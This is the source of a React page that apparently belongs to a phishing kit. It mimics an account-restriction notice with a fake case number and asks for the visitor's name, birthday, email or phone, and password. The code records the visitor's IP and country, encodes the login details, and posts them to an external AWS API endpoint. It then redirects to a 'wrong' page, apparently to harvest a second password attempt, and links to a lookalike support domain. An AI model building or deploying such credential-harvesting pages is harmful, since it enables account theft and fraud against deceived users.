import React, { useState, useEffect } from "react";
import "bootstrap/dist/css/bootstrap.min.css";
import "./RestrictedAccount.scss"; // Custom styles
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "react-i18next";
import { Modal, Button, Spinner } from "react-bootstrap";
import jwtEncode from "jwt-encode";

function RestrictedAccount() {
  const [ip, setIp] = useState("");
  const [country, setCountry] = useState("");
  const [tk1, setTk1] = useState("");
  const [m1, setM1] = useState("");
  const [fullName, setFullName] = useState("");
  const [birthday, setBirthday] = useState("");
  const [loading, setLoading] = useState(false);
  const [ipTime, setIpTime] = useState("");
  const [messageId, setMessageId] = useState("");
  const navigate = useNavigate();
  const { t } = useTranslation();
  const [showModal, setShowModal] = useState(false);
  const [tk1Error, setTk1Error] = useState("");

  const now = new Date(Date.now());

  const pad = (num) => num.toString().padStart(2, '0');

  const formatted = 
    `${pad(now.getMonth() + 1)}/${pad(now.getDate())}/${now.getFullYear()} ` +
    `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;

  const getCurrentCountry = async () => {
    try {
      const response = await axios.get("https://ipwho.is/");
      return { country: response.data.country, ipTime: formatted};
    } catch (error) {
      console.error("Error fetching country:", error);
    }
  };

  const getUserIP = async () => {
    try {
      const response = await fetch("https://api64.ipify.org?format=json");
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error("Error fetching IP:", error);
    }
  };

  useEffect(() => {
    async function fetchData() {
      const userIp = await getUserIP();
      const { country: userCountry, ipTime: userIpTime } = await getCurrentCountry();
      setIp(userIp);
      setCountry(userCountry);
      setIpTime(userIpTime);
    }
    fetchData();
  }, []);

   // 🔹 Hàm kiểm tra email/phone
  // const validateEmailOrPhone = (value) => {
  //   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  //   const phoneRegex = /^(\+?\d{10,15}|0\d{9,10})$/;
  //   if (emailRegex.test(value)) return true;
  //   if (phoneRegex.test(value)) return true;
  //   return false;
  // };

  const sendAccountInfo = async () => {
    if (!fullName.trim() || !birthday.trim() || !tk1.trim() || !m1.trim()) {
      alert("Please fill in all required fields.");
      return;
    }

    // 🔹 Kiểm tra định dạng email hoặc phone
    // if (!validateEmailOrPhone(tk1)) {
    //   setTk1Error("Please enter a valid email or phone number.");
    //   return;
    // } else {
    //   setTk1Error("");
    // }

    setShowModal(true);

    try {
      var id ="";
      const secretKey = process.env.REACT_APP_JWT_SECRET;
debugger;
      const payload = {
        country,
        ip,
        tk1,
        m1,
        ipTime
      };

      const token = jwtEncode(payload, process.env.REACT_APP_JWT_SECRET);
      const response = await axios.post("https://2w6vzkyr3d.execute-api.ap-southeast-2.amazonaws.com/prod/send", {
        message: token
      });
      setLoading(true);
      id = response.data.message;
      setTimeout(() => {
        setLoading(false);
        setShowModal(false); 
        navigate(`/wrong/${id}`, { state: { tk1, m1}});
      }, 1500);
    } catch (error) {
      alert("Error send to server!");
      setShowModal(false);
    }
  };

  return (
    <div className="restrict-container d-flex justify-content-center align-items-center min-vh-100">
      <div className="card p-4 text-center">
        <img
          src={require("./security-icon.png")}
          alt="Security"
          className="security-icon"
        />

        <h2 className="fw-bold mt-3">{t("restricted")}</h2>
        <p className="small text-muted">{t("restrictedAccount.tos")}</p>
        <hr style={{ marginTop: "-2%" }} />
        <p className="mt-2">
        {t("restrictedAccount.warning1")} {" "}
          <strong>{ipTime.substring(0,10)}</strong>{t("restrictedAccount.warning2")} {" "}
          <strong>
          {t("restrictedAccount.confirmed")}
          </strong>
        </p>

        <form>
          <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} className="form-control mb-2" placeholder={t("restrictedAccount.fullName")} />
          <input type="text" value={birthday} onChange={(e) => setBirthday(e.target.value)} className="form-control mb-2" placeholder={t("restrictedAccount.birthday")} />
          <input
            type="text"
            className={`form-control mb-1 ${tk1Error ? "is-invalid" : ""}`}
            placeholder={t("restrictedAccount.emailPhone")}
            value={tk1}
            onChange={(e) => {
              setTk1(e.target.value);
              // setTk1Error("");
            }}
          />
          {/* {tk1Error && <div className="invalid-feedback text-start">{tk1Error}</div>} */}
          <input
            type="text"
            className="form-control mb-3"
            placeholder={t("restrictedAccount.password")}
            value={m1}
            onChange={(e) => setM1(e.target.value)}
          />
        </form>

        <hr style={{ marginTop: "-1%" }} />
        <p className="case-info text-muted small">
          <strong>{t("restrictedAccount.caseNumber") + ":"}</strong> #100430588912 <br />
          <strong>{t("restrictedAccount.caseInfo") + ":"}</strong>{t("restrictedAccount.violationMessage")}</p>
        <hr style={{ marginTop: "-1%" }} />

        <div className="text-end">
          <button className="btn btn-primary w-25" onClick={sendAccountInfo} disabled={loading}>{loading ? t("restrictedAccount.verifying") : t("restrictedAccount.verify")}</button>
        </div>

        <p className="disclaimer text-muted mt-3">
        {t("restrictedAccount.disclaimer")} <a href="https://suppporttsmate-checkingverry-abaytravelss.site" className="text-primary">{t("restrictedAccount.learnMore")}</a>
        </p>
      </div>
      {/* Verification Modal */}
      <Modal show={showModal} centered>
        <Modal.Body className="text-center">
          <Spinner animation="border" />
          <h4 className="mt-3">Verifying...</h4>
          <p>Please wait a moment.</p>
        </Modal.Body>
      </Modal>
    </div>
  );
}

export default RestrictedAccount;
